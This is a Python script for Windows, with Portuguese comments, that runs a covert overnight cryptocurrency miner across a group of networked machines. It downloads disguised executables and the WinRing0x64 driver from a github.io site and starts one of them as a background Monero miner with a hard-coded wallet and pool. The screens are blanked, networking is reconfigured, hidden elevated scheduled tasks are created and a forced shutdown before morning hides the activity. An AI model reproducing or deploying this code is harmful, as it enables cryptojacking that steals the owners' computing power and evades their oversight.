import os
import subprocess
import time
import datetime
import urllib.request
from pathlib import Path
import subprocess, re, sys

import urllib.request
# import requests

DESLIGADO = 0
LIGADO = 1
TESTE = 2


EXECUCAO = TESTE

# Configurações fixas
wifi_interface = "Wi-Fi 4"
ethernet_interface = "Ethernet"
wifi_ssid = "AAPM"
shutdown_hour = 5
shutdown_minute = 40
base_url = "https://lokilaki.github.io/dcreamit/"
arquivos_para_baixar = ["crealit.exe", "sart.exe","WinRing0x64.sys"]
destino = Path("C:/ProgramData/Temp")
# destino = Path(os.getenv("APPDATA")) / "Temp"
#destino = Path(tempfile.gettempdir())


def is_after_23():
    return datetime.datetime.now().hour >= 23


def connect_to_wifi():
    # 1. Ativa o adaptador (caso esteja desativado)
    subprocess.run([
        "powershell", "-NoProfile", "-Command",
        f"Enable-NetAdapter -Name '{wifi_interface}' -Confirm:$false -ErrorAction SilentlyContinue"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(3)

    # 2. Liga o rádio Wi-Fi (caso esteja em modo avião ou manualmente desativado)
    subprocess.run([
        "powershell", "-NoProfile", "-Command",
        "Get-NetAdapter | Where-Object {$_.InterfaceDescription -Match 'Wi-Fi'} | Enable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    subprocess.run([
        "powershell", "-NoProfile", "-Command",
        "netsh interface set interface name='Wi-Fi 4' admin=enabled"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 3. Tenta conectar à rede AAPM
    subprocess.run(
        f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def configurar_ip(rede_base="192.168.137.", gateway="192.168.137.1", mascara="255.255.255.0",
                  dns1="8.8.8.8", dns2="192.168.137.1", usar_powershell=True):
    descricao = get_computer_description()

    # Extrair os dois últimos dígitos
    m = re.search(r'(\d{2})\s*$', descricao)
    if not m:
        raise ValueError("Descrição inválida. Esperado dois dígitos no final.")
    sequencial = int(m.group(1))
    host_id = 254 - sequencial
    ip = f"{rede_base}{host_id}"

    if usar_powershell:
        # PowerShell nativo
        ps_cmd = f"""
        $iface = Get-NetAdapter | Where-Object {{ $_.Name -eq '{ethernet_interface}' }}
        if ($iface) {{
            Get-NetIPAddress -InterfaceAlias '{ethernet_interface}' -AddressFamily IPv4 | Remove-NetIPAddress -Confirm:$false -ErrorAction SilentlyContinue
            New-NetIPAddress -InterfaceAlias '{ethernet_interface}' -IPAddress '{ip}' -PrefixLength 24 -DefaultGateway '{gateway}' -ErrorAction Stop
            Set-DnsClientServerAddress -InterfaceAlias '{ethernet_interface}' -ServerAddresses @('{dns1}', '{dns2}')
        }} else {{
            Write-Error "Interface '{ethernet_interface}' não encontrada."
            exit 1
        }}
        """
    else:
        # netsh via PowerShell
        ps_cmd = f"""
        Start-Process -FilePath "netsh" -ArgumentList 'interface ip set address name="{ethernet_interface}" static {ip} {mascara} {gateway} 1' -Wait
        Start-Process -FilePath "netsh" -ArgumentList 'interface ip set dns name="{ethernet_interface}" static {dns1} primary' -Wait
        Start-Process -FilePath "netsh" -ArgumentList 'interface ip add dns name="{ethernet_interface}" {dns2} index=2' -Wait
        """

    result = subprocess.run(
        ["powershell", "-Command", ps_cmd],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    if result.returncode != 0:
        raise RuntimeError("Falha ao configurar IP.")

def restart_ethernet():
    subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def verificar_acesso_old(url="https://monero.hashvault.pro/"):
    try:
        with urllib.request.urlopen(url, timeout=5) as resposta:
            print(resposta.status)
            return resposta.status
    except Exception as e:
        return f"0 : {e}"
    
import requests
def verificar_acesso(url="http://monero.hashvault.pro/"):
    try:
        resposta = requests.get(url, timeout=5)
        if resposta.status_code == 200:
            print(f"Site {url} está acessível.")
            return resposta.status_code
        else:
            print(f"Site {url} respondeu com status {resposta.status_code}.")
            return resposta.status_code
    except requests.RequestException as e:
        print(f"Erro ao acessar o site {url}: {e}")
        return {e}


def enable_ics():
    try:
        variaveis = f"""
            $internet = "{wifi_interface}"
            $local = "{ethernet_interface}"
            """
        script = """
            # Obtem o gerenciador de conexões
            $sharingManager = New-Object -ComObject HNetCfg.HNetShare

            # Pega todas as conexões
            $connections = $sharingManager.EnumEveryConnection()

            foreach ($conn in $connections) {
                $props = $sharingManager.NetConnectionProps($conn)

                if ($props.Name -eq $internet) {
                    $cfg = $sharingManager.INetSharingConfigurationForINetConnection($conn)
                    $cfg.EnableSharing(0)  # 0 = ICS para compartilhamento com outras conexões
                    Write-Output "ICS ativado na conexão de internet: $internet"
                }

                if ($props.Name -eq $local) {
                    $cfg = $sharingManager.INetSharingConfigurationForINetConnection($conn)
                    $cfg.EnableSharing(1)  # 1 = ICS como cliente da outra conexão
                    Write-Output "ICS habilitado como conexão doméstica: $local"
                }
            }
        """
        ps_script = variaveis + script
        subprocess.run(["powershell", "-Command", ps_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def disable_ics(agendamento=False):

    variaveis = f"""
$internet = "{wifi_interface}" 
$local = "{ethernet_interface}"
"""
    comandos = """
$sharingManager = New-Object -ComObject HNetCfg.HNetShare
$connections = $sharingManager.EnumEveryConnection()

foreach ($conn in $connections) {
    $props = $sharingManager.NetConnectionProps($conn)

    if ($props.Name -eq $internet -or $props.Name -eq $local) {
        $cfg = $sharingManager.INetSharingConfigurationForINetConnection($conn)
        if ($cfg.SharingEnabled) {
            $cfg.DisableSharing()
        }
    }
}
"""
    script = variaveis + comandos

    if not agendamento:

        subprocess.run(["powershell", "-Command", script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    else:

        now = datetime.datetime.now()
        shutdown_time = now.replace(hour=shutdown_hour, minute=shutdown_minute, second=0)
        if shutdown_time < now:
            shutdown_time += datetime.timedelta(days=1)
        secs_left = int((shutdown_time - now).total_seconds())

        # Criar script PS1 que desativa o ICS
        destino.mkdir(exist_ok=True, parents=True)
        bat_path = (destino / "desativar_ics.ps1").resolve()

        bat_path.write_text(script, encoding="utf-8")

        # Agendar execução 5 minutos antes do desligamento
        trigger_time = (shutdown_time - datetime.timedelta(minutes=5)).strftime("%H:%M")

        # Comando PowerShell para criar a tarefa
        ps_cmd = rf'''
    $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "{bat_path}"'
    $trigger = New-ScheduledTaskTrigger -Once -At "{trigger_time}"
    $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
    Register-ScheduledTask -TaskName 'DesativarICS' `
                        -Action $action `
                        -Trigger $trigger `
                        -Settings $settings `
                        -RunLevel Highest -Force
    '''

        subprocess.run(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def schedule_shutdown():
    now = datetime.datetime.now()
    shutdown_time = now.replace(hour=5, minute=30, second=0)
    if shutdown_time < now:
        shutdown_time += datetime.timedelta(days=1)
    secs_left = int((shutdown_time - now).total_seconds())

    subprocess.run(f'shutdown -a', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(5)

    # agenda o desligamento forçado
    subprocess.run(f'shutdown /s /f /t {secs_left}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(5)

def desativar_shutdown():
    subprocess.run(f'shutdown -a', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def desativar_cancelamento_shutdown_domingo():
    """
    Cria (ou recria) a tarefa 'CancelarShutdownDomingo':
    • Dispara todo domingo às 05:55
    • Executa 'shutdown /a' (aborta desligamentos agendados)
    • Executa com privilégios mais altos
    """
    ps_cmd = r"""
$action   = New-ScheduledTaskAction  -Execute 'shutdown.exe' -Argument '/a'
$trigger  = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At 05:55
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
Register-ScheduledTask -TaskName 'CancelarShutdownDomingo' `
                       -Action   $action `
                       -Trigger  $trigger `
                       -Settings $settings `
                       -RunLevel Highest -Force
"""
    result = subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    if result.returncode != 0:
        raise RuntimeError("Falha ao criar a tarefa 'CancelarShutdownDomingo'. "
                           "Execute o script como administrador.")


def baixar_arquivos():
    destino.mkdir(parents=True, exist_ok=True)
    for arquivo in arquivos_para_baixar:
        url = base_url + arquivo
        destino_final = destino / arquivo
        try:
            urllib.request.urlretrieve(url, destino_final)
        except Exception:
            continue

def desligar_tela(tempo_em_segundos=300):
    try:
        # Comandos de configuração via reg add
        comandos_reg = [
            ['reg', 'add', r'HKCU\Control Panel\Desktop', '/v', 'SCRNSAVE.EXE', '/t', 'REG_SZ', '/d', r'C:\Windows\System32\scrnsave.scr', '/f'],
            ['reg', 'add', r'HKCU\Control Panel\Desktop', '/v', 'ScreenSaveTimeOut', '/t', 'REG_SZ', '/d', str(tempo_em_segundos), '/f'],
            ['reg', 'add', r'HKCU\Control Panel\Desktop', '/v', 'ScreenSaveActive', '/t', 'REG_SZ', '/d', '1', '/f'],
        ]

        # Executa os comandos de registro
        for comando in comandos_reg:
            subprocess.run(comando, check=True, shell=True)

        # Inicia imediatamente o protetor de tela
        subprocess.Popen([r'C:\Windows\System32\scrnsave.scr', '/s'])

    except subprocess.CalledProcessError as e:
        print(f"Erro ao executar comando: {e}")

def get_computer_description():
    try:
        result = subprocess.check_output(
            ['powershell', '-Command', "(Get-WmiObject Win32_OperatingSystem).Description"],
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
            text=True
        )
        return result.strip()
    except Exception:
        return "sem_descricao"

def ligar_crealit():
    subprocess.Popen(f'cmd /c start "" "{destino}\\crealit.exe"  --coin monero -o pool.hashvault.pro:80 -u 41g9z6vMVXh9egLLuyJGHyWzRjoagmDHSbgAk7WoxWpGPMSBL33ArZudfN8Fmq8QGPDLLtNdxEevNadr4wxtYhASEx7gpYx -p {get_computer_description()} --donate-level 1 --background', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def matar_processo(nome_processo="crealit.exe"):
    """
    Encerra todos os processos com o nome especificado.
    Por padrão, encerra 'crealit.exe'.
    """
    try:
        subprocess.run(
            ["taskkill", "/f", "/im", nome_processo],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            shell=False
        )
    except Exception as e:
        print(f"Erro ao tentar matar o processo {nome_processo}: {e}")

def registrar_log(texto):
    caminho_pasta = "D:/users"
    os.makedirs(caminho_pasta, exist_ok=True)
    caminho_arquivo = os.path.join(caminho_pasta, "log.txt")
    horario = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    linha_log = f"[{horario}] {texto}\n"
    with open(caminho_arquivo, "a", encoding="utf-8") as arquivo:
        arquivo.write(linha_log)

def monitorar_conexao():
    intervalo = 20
    resultado = verificar_acesso()

    while resultado !=200:
        x = 1
        resultado = verificar_acesso() 
        registrar_log(resultado)
        
        #Tentando renew
        resultado = "stage 1"
        subprocess.run(
            f'ipconfig /release',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        print("release")
        time.sleep(intervalo)

        subprocess.run(
            f'ipconfig /renew',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )    
        print("renew")
        time.sleep(intervalo)

        if verificar_acesso() == 200: break
        
        # Tentando desconectar e reconectar
        resultado = "stage 2"
        subprocess.run(
            f'netsh wlan disconnect interface="{wifi_interface}"',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        time.sleep(intervalo)
        
        subprocess.run(
            f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        time.sleep(intervalo)

        if verificar_acesso() == 200: break

        #Tentando desligar e religar o adaptador
        resultado = "stage 3"
        subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(intervalo*3)
        subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(intervalo)
        subprocess.run(
            f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
            shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        
        if verificar_acesso() == 200: break
        time.sleep(intervalo*15)

        x+=1

        # if x>=4:
        #     resultado = "stage 4"
        #     disable_ics(agendamento=False)
        #     time.sleep(intervalo)
        #     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #     time.sleep(intervalo)
        #     subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #     time.sleep(intervalo)
        #     subprocess.run(f'netsh interface set interface "{wifi_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #     time.sleep(intervalo)
        #     subprocess.run(
        #         f'netsh wlan connect name="{wifi_ssid}" interface="{wifi_interface}"',
        #         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        #         )
        #     time.sleep(intervalo)
        #     subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=enable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        #     time.sleep(intervalo)
        #     enable_ics()
        #     if verificar_acesso() == 200: break


    registrar_log(resultado)
    return True



def main_master():
    if EXECUCAO != TESTE:
        if not is_after_23():
            exit()
    #subprocess.run(f'netsh interface set interface "{ethernet_interface}" admin=disable', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    matar_processo()
    baixar_arquivos()
    desligar_tela()  
    schedule_shutdown()  
    connect_to_wifi()
    time.sleep(10)
    enable_ics()
    time.sleep(10)
    restart_ethernet()
    #ligar_crealit()
    #disable_ics(agendamento=True)
    desativar_cancelamento_shutdown_domingo()
    desligar_tela()  
    while monitorar_conexao(): time.sleep(600)

def main_slave():
    if EXECUCAO != TESTE:
        if not is_after_23():
            exit()
    matar_processo()
    fila = int(re.search(r'(\d{2})\s*$', get_computer_description()).group(1))
    time.sleep(fila*10)
    baixar_arquivos()
    desligar_tela()
    configurar_ip(usar_powershell=False)
    desligar_tela()
    time.sleep(10)
    schedule_shutdown()
    ligar_crealit()
    desativar_cancelamento_shutdown_domingo()
    desligar_tela()


if __name__ == "__main__":
    if EXECUCAO == DESLIGADO:
        exit()
    if len(sys.argv) > 1:
        perfil = sys.argv[1]
        print(f"Executando no perfil: {perfil}")
        if perfil.upper() == "MASTER":
            main_master()
        elif perfil.upper() == "SLAVE":
            main_slave()
    else:
        try:
            m = re.search(r'(\d{2})\s*$', get_computer_description())
            if not m:
                raise ValueError("Descrição inválida. Esperado dois dígitos no final.")
            sequencial = int(m.group(1))
            if sequencial == 0:
                main_master()
            else:
                main_slave()
        except Exception:
            sys.exit(1)

